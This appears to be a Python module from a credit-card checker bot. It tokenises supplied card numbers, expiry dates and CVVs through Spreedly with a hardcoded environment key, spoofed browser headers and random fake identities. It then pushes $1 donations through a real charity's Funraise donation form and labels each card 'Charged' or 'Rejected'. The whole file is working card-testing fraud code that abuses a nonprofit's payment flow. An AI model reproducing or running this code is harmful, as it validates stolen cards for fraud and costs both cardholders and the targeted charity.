import os
import random
import string
from .rand_user import random_user_api
from ..filters.checker_defs import find_between, remove_html_tags



def one(s, cc,mes,ano,cvv,rand_user):
    url = 'https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.72'
    data = '{"environment_key":"KvcTOx3FPBgscLs51rjT848DP7p","payment_method":{"credit_card":{"number":"'+cc+'","verification_value":"'+cvv+'","first_name":"' + rand_user.first_name + '","last_name":"' + rand_user.last_name + '","email":"atmos@gmail.com","month":"'+mes+'","year":"'+ano+'","zip":"10080","phone_number":"' + str(rand_user.phone) + '"}}}'
    headers = {
        'authority': 'core.spreedly.com',
    'method': 'POST',
    'path': '/v1/payment_methods/restricted.json?from=iframe&v=1.72',
    'scheme': 'https',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-length': '272',
    'content-type': 'application/json',
    'origin': 'https://core.spreedly.com',
    'referer': 'https://core.spreedly.com/v1/embedded/number-frame.html?v=1.72',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'spreedly-environment-key': 'KvcTOx3FPBgscLs51rjT848DP7p',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'
    }
    a = s.post(data=data, url=url, headers=headers)
    token = find_between(a.text, 'payment_method\":{\"token\":\"', '"')
    mes1 = find_between(a.text, 'month":', ',')
    ano1 = find_between(a.text, 'year":', ',')
    return False  if not token else token,mes1,ano1


def two(s,token, mes1,ano1, rand_user):
    url = 'https://platform.funraise.io/api/v2/transaction'
    headers = {
    'authority': 'platform.funraise.io',
'method': 'POST',
'path': '/api/v2/transaction',
'scheme': 'https',
'accept': 'application/json',
'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
'content-length': '920',
'content-type': 'application/json; charset=UTF-8',
'origin': 'https://assets.funraise.io',
'referer': 'https://assets.funraise.io/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
'x-org-id': '8356507b-1392-4c21-a85d-efd40ba97840'
}
    data = '{"supportsDonorCoversFees":true,"donorCoveredFees":true,"currency":"USD","storeOrderAmount":0,"donationAmount":1,"baseAmount":1,"tipAmount":0,"amount":1.37,"dcfFeeAmount":0.37,"formAllocationId":"5513","tags":null,"paymentType":"card","frequency":"o","recurring":false,"allowsDonations":true,"answers":null,"showAutocomplete":true,"addressDisabled":false,"submittingPayment":false,"submittingText":"","recaptchaNotSolved":false,"postalCodeValidationErrorMessage":"","emailOptIn":true,"firstName":"' + rand_user.last_name + '","lastName":"' + rand_user.last_name + '","email":"' + rand_user.email + '","phone":"' + rand_user.phone + '","postalCode":"10080","paymentToken":"'+token+'","month":'+mes1+',"year":'+ano1+',"pageId":null,"tipPercent":4,"currencySymbol":"$","organizationId":"8356507b-1392-4c21-a85d-efd40ba97840","formId":11297,"sourceUrl":"https://sikhri.org/donate","referrer":"","forter":{"tokenCookie":"8af8f320856545d7bc1087e942effa9f_1646318596242__UDF43s_13ck_tt"}}'
    b = s.post(data=data, headers=headers, url=url)
    return b.json()['id'] if 'id' in b.json() else False

def three(s,check):
    url = f'https://platform.funraise.io/api/v2/transaction/{check}'
    headers = {
        'authority': 'platform.funraise.io',
    'method': 'GET',
    'path': '/api/v2/transaction/'+check+'',
    'scheme': 'https',
    'accept': 'application/json',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'origin': 'https://assets.funraise.io',
    'referer': 'https://assets.funraise.io/',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'
    }
    resp = s.get(headers=headers, url=url)
    result = resp.text
    if 'Succeeded' in result:
        r_text, r_logo, r_respo = "Charged $1", "✅", 'Charged'
    else:
        r_respo = "Rejected"
        r_logo = '❌'
        err = find_between(result, '{\"message\":\"', '\"')
        print(err)
        r_text = err if err else "Declined"
    return r_text, r_logo, r_respo